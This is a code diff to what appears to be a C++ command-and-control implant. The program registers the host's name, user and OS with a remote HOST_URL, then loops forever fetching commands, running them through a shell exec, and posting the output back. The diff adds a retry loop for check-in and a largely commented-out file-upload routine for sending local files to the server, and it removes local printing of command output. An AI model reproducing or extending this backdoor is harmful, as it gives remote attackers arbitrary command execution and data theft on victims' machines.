@@ -5,6 +5,7 @@
 #include <chrono>
 #include <iostream>
 #include "curl/curl.h"
+#include <sys/stat.h>
 
 using namespace std; 
 
@@ -89,7 +90,6 @@ string post(string url, string data) {
         res = curl_easy_perform(curl);
         curl_easy_cleanup(curl);
     }
-
     return read_buffer;
 }
 
@@ -109,20 +109,87 @@ void download_file(string url, string location) {
     }
 }
 
+static size_t read_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
+    curl_off_t nread;
+    size_t retcode = fread(ptr, size, nmemb, stream);
+    nread = (curl_off_t)retcode;
+    return retcode;
+}
+
+
+void upload_file(string url, string location) {
+    //Shell method
+    //exec("curl -F \"upload_filename=@" + location + "\" -L " + url);
+
+    //CURL Method
+    /*CURL *curl = curl_easy_init();
+    FILE *fp;
+    CURLcode res;
+    struct stat file_info;
+    curl_off_t fsize;
+
+    string fileType = location;
+    size_t idx;
+
+    idx = fileType.find(".");
+
+    string result = fileType.substr(idx+1);
+
+    if(result == "txt")
+        result = "text/plain";
+
+    struct curl_slist *headers = NULL;
+
+    string contentType = "Content-Type: " + result;
+
+    headers = curl_slist_append(headers, contentType.c_str());
+
+    fp = fopen(location.c_str(), "rb");
+    if(!fp)
+        return;
+
+    if(fstat(fileno(fp), &file_info) != 0)
+        return;
+
+    if (curl) {
+        //curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_data_file);
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        
+        curl_easy_setopt(curl, CURLOPT_READDATA, fp);
+
+        curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)file_info.st_size);
+        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+        curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+        fclose(fp);
+    }*/
+}
+
 int main() {
     string hostname = exec("hostname");
     string user = exec("id -un");
     string os = get_os();
 
-    string id = post(HOST_URL + "connect", "hostname=" + hostname +
-            "&user=" + user + "&os=" + os);
+    string id = "";
+    while(id == "")
+    {
+        id = post(HOST_URL + "connect", "hostname=" + hostname +
+                "&user=" + user + "&os=" + os);
+        //this_thread::sleep_for(chrono::seconds(3));
+    }
+
+    //Local file test
+    //upload_file(HOST_URL + "fileupload", "/home/davidpruitt/Desktop/Files/text.txt");
+
 
     while (true) {
         string command = post(HOST_URL + "command", "id=" + id);
 
         if (!command.empty()) {
             string output = exec(command);
-            cout << output << endl;
             post(HOST_URL + "output", "id=" + id + "&output=" + output);
         }
 
